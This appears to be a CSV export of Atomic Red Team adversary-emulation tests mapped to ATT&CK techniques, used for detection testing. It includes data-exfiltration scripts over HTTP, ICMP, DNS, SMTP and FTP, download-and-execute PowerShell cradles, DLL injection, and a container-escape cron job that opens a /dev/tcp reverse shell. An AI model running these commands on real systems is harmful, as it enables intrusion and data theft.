",,,"input_arguments.Session_ID.description: The ID of the session to which you want to connect

input_arguments.Session_ID.type: string

input_arguments.Session_ID.default: 1337

input_arguments.Destination_ID.description: Connect the session of another user to a different session

input_arguments.Destination_ID.type: string

input_arguments.Destination_ID.default: rdp-tcp#55

"
T1553.001,Subvert Trust Controls: Gatekeeper Bypass,Gatekeeper Bypass,fb3d46c6-9480-4803-8d7d-ce676e1f1a9b,"Gatekeeper Bypass via command line
",macos,,,"sudo xattr -d com.apple.quarantine #{app_path}
",sh,True,,,,,"input_arguments.app_path.description: Path to app to be used

input_arguments.app_path.type: path

input_arguments.app_path.default: myapp.app

"
T1546.005,Event Triggered Execution: Trap,Trap EXIT,a74b2e07-5952-4c03-8b56-56274b076b61,"Launch bash shell with command arg to create TRAP on EXIT.
The trap executes script that writes to /tmp/art-fish.txt
",macos,linux,,"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'
",sh,,,"rm -f /tmp/art-fish.txt
",,,
T1546.005,Event Triggered Execution: Trap,Trap EXIT (freebsd),be1a5d70-6865-44aa-ab50-42244c9fd16f,"Launch bash shell with command arg to create TRAP on EXIT.
The trap executes script that writes to /tmp/art-fish.txt
",linux,,,"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'
",sh,,,"rm -f /tmp/art-fish.txt
",sh,"dependencies.0.description: Check if bash is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v bash)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y bash)

",
T1546.005,Event Triggered Execution: Trap,Trap SIGINT,a547d1ba-1d7a-4cc5-a9cb-8d65e8809636,"Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.
The trap executes script that writes to /tmp/art-fish.txt
",macos,linux,,"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'
",sh,,,"rm -f /tmp/art-fish.txt
",,,
T1546.005,Event Triggered Execution: Trap,Trap SIGINT (freebsd),ade10242-1eac-43df-8412-be0d4c704ada,"Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.
The trap executes script that writes to /tmp/art-fish.txt
",linux,,,"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'
",sh,,,"rm -f /tmp/art-fish.txt
",sh,"dependencies.0.description: Check if bash is installed.

dependencies.0.prereq_command: if [ ! -x ""$(command -v bash)"" ]; then exit 1; else exit 0; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y bash)

",
T1614.001,System Location Discovery: System Language Discovery,Discover System Language by Registry Query,631d4cf1-42c9-4209-8fe9-6bd4de9421be,"Identify System language by querying the registry on an endpoint. 

Upon successful execution, result in number format can be looked up to correlate the language.
",windows,,,"reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language
",command_prompt,,,,,,
T1614.001,System Location Discovery: System Language Discovery,Discover System Language with chcp,d91473ca-944e-477a-b484-0e80217cd789,"Identify System language with the chcp command.

Upon successful execution, result in number format can be looked up to correlate the language.
",windows,,,"chcp
",command_prompt,,,,,,
T1614.001,System Location Discovery: System Language Discovery,Discover System Language with locale,837d609b-845e-4519-90ce-edc3b4b0e138,"Identify System language with the `locale` command.

Upon successful execution, the output will contain the environment variables that indicate
the 5 character locale that can be looked up to correlate the language and territory.
",linux,,,"locale
",sh,,,,,,
T1614.001,System Location Discovery: System Language Discovery,Discover System Language with localectl,07ce871a-b3c3-44a3-97fa-a20118fdc7c9,"Identify System language with the `localectl` command.

Upon successful execution, the key `System Locale` from the output will contain the
`LANG` environment variable that has the 5 character locale result that can be looked
up to correlate the language and territory.
",linux,,,"localectl status
",sh,,,,,,
T1614.001,System Location Discovery: System Language Discovery,Discover System Language by locale file,5d7057c9-2c8a-4026-91dd-13b5584daa69,"Identify System language with the by reading the locale configuration file.

The locale configuration file contains the `LANG` environment variable which
will contain the 5 character locale that can be looked up to correlate the
language and territory.
",linux,,,"[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale
",sh,,,,sh,"dependencies.0.description: Check the location of the locale configuration file.

dependencies.0.prereq_command: [ -f /etc/locale.conf ] || [ -f /etc/default/locale ] && exit 0 || exit 1

dependencies.0.get_prereq_command: echo ""Test only valid for systems that have locale file""

",
T1614.001,System Location Discovery: System Language Discovery,Discover System Language by Environment Variable Query,cb8f7cdc-36c4-4ed0-befc-7ad7d24dfd7a,"Identify System language by checking the environment variables

Upon successful execution, the 5 character locale result can be looked up to
correlate the language and territory. Environment query commands are likely
to run with a pattern match command e.g. `env | grep LANG`

Note: `env` and `printenv` will usually provide the same results. `set` is
also used as a builtin command that does not generate syscall telemetry but
does provide a list of the environment variables.
",linux,,,"env | grep LANG
printenv LANG
set | grep LANG
",sh,,,,sh,"dependencies.0.description: Check if printenv command exists on the machine

dependencies.0.prereq_command: [ -x ""$(command -v printenv)"" ] && exit 0 || exit 1

dependencies.0.get_prereq_command: echo ""printenv command does not exist""
exit 1

",
T1056.004,Input Capture: Credential API Hooking,Hook PowerShell TLS Encrypt/Decrypt Messages,de1934ea-1fbf-425b-8795-65fb27dd7e33,"Hooks functions in PowerShell to read TLS Communications
",windows,,,"mavinject $pid /INJECTRUNNING ""#{file_name}""
Invoke-WebRequest #{server_name} -UseBasicParsing
",powershell,True,,,powershell,"dependencies.0.description: T1056.004x64.dll must exist on disk at specified location (#{file_name})

dependencies.0.prereq_command: if (Test-Path ""#{file_name}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{file_name}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll"" -OutFile ""#{file_name}"" -UseBasicParsing

","input_arguments.file_name.description: Dll To Inject

input_arguments.file_name.type: path

input_arguments.file_name.default: PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll

input_arguments.server_name.description: TLS Server To Test Get Request

input_arguments.server_name.type: url

input_arguments.server_name.default: https://www.example.com

"
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - HTTP,1d1abbd6-a3d3-4b2e-bef5-c59293f46eff,"A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.

Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.
",macos,linux,,,manual,,"1. Victim System Configuration:

    mkdir /tmp/victim-staging-area
    echo ""this file will be exfiltrated"" > /tmp/victim-staging-area/victim-file.txt

2. Using Python to establish a one-line HTTP server on victim system:

    cd /tmp/victim-staging-area
    python -m SimpleHTTPServer 1337

3. To retrieve the data from an adversary system:

    wget http://VICTIM_IP:1337/victim-file.txt
",,,,
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - ICMP,dd4b4421-2e25-4593-90ae-7021947ad12e,"Exfiltration of specified file over ICMP protocol.

Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.
",windows,,,"$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(""#{ip_address}"", 1500, $Data) }
",powershell,,,,,,"input_arguments.input_file.description: Path to file to be exfiltrated.

input_arguments.input_file.type: path

input_arguments.input_file.default: C:\Windows\System32\notepad.exe

input_arguments.ip_address.description: Destination IP address where the data should be sent.

input_arguments.ip_address.type: string

input_arguments.ip_address.default: 127.0.0.1

"
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - DNS,c403b5a4-b5fc-49f2-b181-d1c80d27db45,"Exfiltration of specified file over DNS protocol.
",linux,,,,manual,,"1. On the adversary machine run the below command.

    tshark -f ""udp port 53"" -Y ""dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches "".domain"""" >> received_data.txt

2. On the victim machine run the below commands.

    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done
    
3. Once the data is received, use the below command to recover the data.

    cat output_file | cut -d ""A"" -f 2 | cut -d "" "" -f 2 | cut -d ""."" -f 1 | sort | uniq | xxd -p -r
",,,,
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - HTTP,6aa58451-1121-4490-a8e9-1dada3f1c68c,"Exfiltration of specified file over HTTP.
Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.
",windows,,,"$content = Get-Content #{input_file}
Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
",powershell,,,,,,"input_arguments.input_file.description: Path to file to exfiltrate

input_arguments.input_file.type: path

input_arguments.input_file.default: C:\Windows\System32\notepad.exe

input_arguments.ip_address.description: Destination IP address where the data should be sent

input_arguments.ip_address.type: string

input_arguments.ip_address.default: http://127.0.0.1

"
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - SMTP,ec3a835e-adca-4c7c-88d2-853b69c11bb9,"Exfiltration of specified file over SMTP.
Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.
",windows,,,"Send-MailMessage -From #{sender} -To #{receiver} -Subject ""T1048.003 Atomic Test"" -Attachments #{input_file} -SmtpServer #{smtp_server}
",powershell,,,,,,"input_arguments.input_file.description: Path to file to exfiltrate

input_arguments.input_file.type: path

input_arguments.input_file.default: C:\Windows\System32\notepad.exe

input_arguments.sender.description: The email address of the sender

input_arguments.sender.type: string

input_arguments.sender.default: test@corp.com

input_arguments.receiver.description: The email address of the receiver

input_arguments.receiver.type: string

input_arguments.receiver.default: test@corp.com

input_arguments.smtp_server.description: SMTP server to use for email transportation

input_arguments.smtp_server.type: string

input_arguments.smtp_server.default: 127.0.0.1

"
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,MAZE FTP Upload,57799bc2-ad1e-4130-a793-fb0c385130ba,"This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.
Upon successful execution, all 7z files within the %windir%\temp directory will be uploaded to a remote FTP server. 
Reference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents
",windows,,,"$Dir_to_copy = ""$env:windir\temp""
$ftp = ""ftp://#{ftp_server}/""
$web_client = New-Object System.Net.WebClient
$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')
if (test-connection -count 1 -computername ""#{ftp_server}"" -quiet)
{foreach($file in (dir $Dir_to_copy ""*.7z""))
{echo ""Uploading $file...""
$uri = New-Object System.Uri($ftp+$file.name)
$web_client.UploadFile($uri, $file.FullName)}}
else
{echo ""FTP Server Unreachable. Please verify the server address in input args and try again.""}
",powershell,,,"$ftp = ""ftp://#{ftp_server}/""
try {foreach ($file in (dir ""$env:windir\temp"" ""*.7z""))
{$uri = New-Object System.Uri($ftp+$file.name)
 $ftp_del = [System.Net.FtpWebRequest]::create($uri)
 $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')
 $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
 $ftp_del.GetResponse()}} catch{}
",,,"input_arguments.ftp_server.description: FTP Server address

input_arguments.ftp_server.type: string

input_arguments.ftp_server.default: 127.0.0.1

input_arguments.username.description: Username for FTP server login

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: Password for FTP server login

input_arguments.password.type: string

input_arguments.password.default: None

"
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - FTP - Rclone,b854eb97-bf9b-45ab-a1b5-b94e4880c56b,"Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.
[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",windows,,,"$rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include ""rclone.exe"" | Select-Object -ExpandProperty FullName
$exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include ""exfil.zip"" | Select-Object -ExpandProperty FullName
&$rclone_bin config create ftpserver ""ftp"" ""host"" #{ftp_server} ""port"" #{ftp_port} ""user"" #{ftp_user} ""pass"" #{ftp_pass}
&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",powershell,True,,,powershell,"dependencies.0.description: Check if the exfil package exists

dependencies.0.prereq_command: if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: fsutil file createnew C:\Users\Public\Downloads\exfil.zip 20485760

dependencies.1.description: Check if rclone zip exists
dependencies.1.prereq_command: if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: Invoke-WebRequest -Uri ""https://downloads.rclone.org/rclone-current-windows-amd64.zip"" -OutFile ""C:\Users\Public\Downloads\rclone-current-windows-amd64.zip""
Expand-Archive C:\Users\Public\Downloads\rclone-current-windows-amd64.zip -DestinationPath C:\Users\Public\Downloads\

","input_arguments.ftp_server.description: Your own ftp server

input_arguments.ftp_server.type: string

input_arguments.ftp_server.default: ftp.dlptest.com

input_arguments.ftp_pass.description: Your FTP user's password

input_arguments.ftp_pass.type: string

input_arguments.ftp_pass.default: rNrKYTX9g7z3RgJRmxWuGHbeu

input_arguments.ftp_user.description: Your FTP username

input_arguments.ftp_user.type: string

input_arguments.ftp_user.default: dlpuser

input_arguments.ftp_port.description: Your FTP's port

input_arguments.ftp_port.type: integer

input_arguments.ftp_port.default: 21

"
T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Python3 http.server,3ea1f938-f80a-4305-9aa8-431bc4867313,"An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.
",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9
if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
",sh,False,,,,,
T1611,Escape to Host,Deploy container using nsenter container escape,0b2f9520-a17a-4671-9dba-3bd034099fff,"In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.

Additional Details:
- https://twitter.com/mauilion/status/1129468485480751104
- https://securekubernetes.com/scenario_2_attack/
",containers,,,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{""spec"":{""hostPID"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=/proc/1/ns/mnt"",""--"",""/bin/bash""],""stdin"": true,""tty"":true,""securityContext"":{""privileged"":true}}]}}'
",sh,,,"kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
",sh,"dependencies.0.description: Verify docker is installed.
dependencies.0.prereq_command: which docker

dependencies.0.get_prereq_command: if [ """" == ""`which docker`"" ]; then echo ""Docker Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install docker ; elif [ -n ""`which yum`"" ]; then sudo yum -y install docker ; fi ; else echo ""Docker installed""; fi

dependencies.1.description: Verify docker service is running.
dependencies.1.prereq_command: sudo systemctl status docker

dependencies.1.get_prereq_command: sudo systemctl start docker

dependencies.2.description: Verify kind is in the path.
dependencies.2.prereq_command: which kind

dependencies.2.get_prereq_command: curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
chmod +x ./kind
mv kind /usr/bin/kind

dependencies.3.description: Verify kind-atomic-cluster is created
dependencies.3.prereq_command: sudo kind get clusters

dependencies.3.get_prereq_command: sudo kind create cluster --name atomic-cluster

dependencies.4.description: Verify kubectl is in path
dependencies.4.prereq_command: which kubectl

dependencies.4.get_prereq_command: curl -LO ""https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl""
chmod +x ./kubectl
mv kubectl /usr/bin/kubectl

",
T1611,Escape to Host,Mount host filesystem to escape privileged Docker container,6c499943-b098-4bc6-8d38-0956fc182984,"This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.
The container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.
Dev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. 
",containers,,,"if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi
echo -n ""* * * * * root /bin/bash -c '/bin/bash -c echo \""\""; echo \""hello from host! "" > #{mount_point}#{cron_path}/#{cron_filename}
echo -n ""$"" >> #{mount_point}#{cron_path}/#{cron_filename}
echo -n ""(hostname) "" >> #{mount_point}#{cron_path}/#{cron_filename}
echo -n ""$"" >> #{mount_point}#{cron_path}/#{cron_filename}
echo ""(id)\"" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'"" >> #{mount_point}#{cron_path}/#{cron_filename}
netcat -l -p #{listen_port} 2>&1
",sh,True,,"rm #{mount_point}#{cron_path}/#{cron_filename}
umount #{mount_point}
rmdir #{mount_point}
",sh,"dependencies.0.description: Verify mount is installed.
dependencies.0.prereq_command: which mount

dependencies.0.get_prereq_command: if [ """" == ""`which mount`"" ]; then echo ""mount Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install mount ; elif [ -n ""`which yum`"" ]; then sudo yum -y install mount ; fi ; else echo ""mount installed""; fi

dependencies.1.description: Verify container is privileged.
dependencies.1.prereq_command: capsh --print | grep cap_sys_admin

dependencies.1.get_prereq_command: if [ ""`capsh --print | grep cap_sys_admin`"" == """" ]; then echo ""Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true""; fi

dependencies.2.description: Verify mount device (/dev/dm-0) exists.
dependencies.2.prereq_command: ls #{mount_device}

dependencies.2.get_prereq_command: if [ ! -f #{mount_device} ]; then echo ""Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true""; fi

dependencies.3.description: Netcat is installed.
dependencies.3.prereq_command: which netcat

dependencies.3.get_prereq_command: if [ """" == ""`which netcat`"" ]; then echo ""netcat Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install netcat ; elif [ -n ""`which yum`"" ]; then sudo yum -y install netcat ; fi

dependencies.4.description: IP Address is known.
dependencies.4.prereq_command: if [ ""#{listen_address}"" != """" ]; then echo ""Listen address set as #{listen_address}"" ; fi

dependencies.4.get_prereq_command: if [ """" == ""`which ifconfig`"" ]; then echo ""ifconfig Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install net=tools ; elif [ -n ""`which yum`"" ]; then sudo yum -y install net-tools ; fi

","input_arguments.mount_device.description: Path to the device of the host's disk to mount

input_arguments.mount_device.type: path

input_arguments.mount_device.default: /dev/dm-0

input_arguments.mount_point.description: Path where the host filesystem will be mounted

input_arguments.mount_point.type: path

input_arguments.mount_point.default: /mnt/T1611.002

input_arguments.cron_path.description: Path on the host filesystem where cron jobs are stored

input_arguments.cron_path.type: path

input_arguments.cron_path.default: /etc/cron.d

input_arguments.cron_filename.description: Filename of the cron job in cron_path

input_arguments.cron_filename.type: string

input_arguments.cron_filename.default: T1611_002

input_arguments.listen_address.description: IP address to listen for callback from the host system.

input_arguments.listen_address.type: string

input_arguments.listen_address.default: `ifconfig eth0 | grep inet | awk '{print $2}'`

input_arguments.listen_port.description: TCP Port to listen on for callback from the host system.

input_arguments.listen_port.type: integer

input_arguments.listen_port.default: 4444

"
T1115,Clipboard Data,Utilize Clipboard to store or execute commands from,0cd14633-58d4-4422-9ede-daa2c9474ae7,"Add data to clipboard to copy off or execute commands from.
",windows,,,"dir | clip
echo ""T1115"" > %temp%\T1115.txt
clip < %temp%\T1115.txt
",command_prompt,,,"del %temp%\T1115.txt >nul 2>&1
",,,
T1115,Clipboard Data,Execute Commands from Clipboard using PowerShell,d6dc21af-bec9-4152-be86-326b6babd416,"Utilize PowerShell to echo a command to clipboard and execute it
",windows,,,"echo Get-Process | clip
Get-Clipboard | iex
",powershell,,,,,,
T1115,Clipboard Data,Execute commands from clipboard,1ac2247f-65f8-4051-b51f-b0ccdfaaa5ff,Echo a command to clipboard and execute it,macos,,,"echo ifconfig | pbcopy
$(pbpaste)",bash,,,,,,
T1115,Clipboard Data,Collect Clipboard Data via VBA,9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52,"This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\atomic_T1115_clipboard_data.txt
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value ""Atomic T1115 Test, grab data from clipboard via VBA""
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1115\src\T1115-macrocode.txt"" -officeProduct ""Word"" -sub ""GetClipboard""
",powershell,,,"Remove-Item ""$env:TEMP\atomic_T1115_clipboard_data.txt"" -ErrorAction Ignore
",powershell,"dependencies.0.description: Microsoft #{ms_product} must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.ms_product.description: Maldoc application Word

input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
T1115,Clipboard Data,Add or copy content to clipboard with xClip,ee363e53-b083-4230-aff3-f8d955f2d5bb,"Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.
",linux,,,"apt install xclip -y
history | tail -n 30 | xclip -sel clip
xclip -o > history.txt
",sh,,,,,,
T1559,Inter-Process Communication,Cobalt Strike Artifact Kit pipe,bd13b9fc-b758-496a-b81a-397462f82c72,"Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 1
",command_prompt,,,,powershell,"dependencies.0.description: Named pipe executors must exist on disk

dependencies.0.prereq_command: if ((Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"") -and (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_client.exe"") -and (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_server.exe"")) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing)
$zipUrl  = ""https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip""
Invoke-FetchFromZip $zipUrl ""*.exe"" ""PathToAtomicsFolder\..\ExternalPayloads""

",
T1559,Inter-Process Communication,Cobalt Strike Lateral Movement (psexec_psh) pipe,830c8b6c-7a70-4f40-b975-8bbe74558acd,"Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 2
",command_prompt,,,,powershell,"dependencies.0.description: Named pipe executors must exist on disk

dependencies.0.prereq_command: if ((Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"") -and (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_client.exe"") -and (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_server.exe"")) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing)
$zipUrl  = ""https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip""
Invoke-FetchFromZip $zipUrl ""*.exe"" ""PathToAtomicsFolder\..\ExternalPayloads""

",
T1559,Inter-Process Communication,Cobalt Strike SSH (postex_ssh) pipe,d1f72fa0-5bc2-4b4b-bd1e-43b6e8cfb2e6,"Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 3
",command_prompt,,,,powershell,"dependencies.0.description: Named pipe executors must exist on disk

dependencies.0.prereq_command: if ((Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"") -and (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_client.exe"") -and (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_server.exe"")) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing)
$zipUrl  = ""https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip""
Invoke-FetchFromZip $zipUrl ""*.exe"" ""PathToAtomicsFolder\..\ExternalPayloads""

",
T1559,Inter-Process Communication,Cobalt Strike post-exploitation pipe (4.2 and later),7a48f482-246f-4aeb-9837-21c271ebf244,"Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 4
",command_prompt,,,,powershell,"dependencies.0.description: Named pipe executors must exist on disk

dependencies.0.prereq_command: if ((Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"") -and (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_client.exe"") -and (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_server.exe"")) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing)
$zipUrl  = ""https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip""
Invoke-FetchFromZip $zipUrl ""*.exe"" ""PathToAtomicsFolder\..\ExternalPayloads""

",
T1559,Inter-Process Communication,Cobalt Strike post-exploitation pipe (before 4.2),8dbfc15c-527b-4ab0-a272-019f469d367f,"Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.

The named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 5
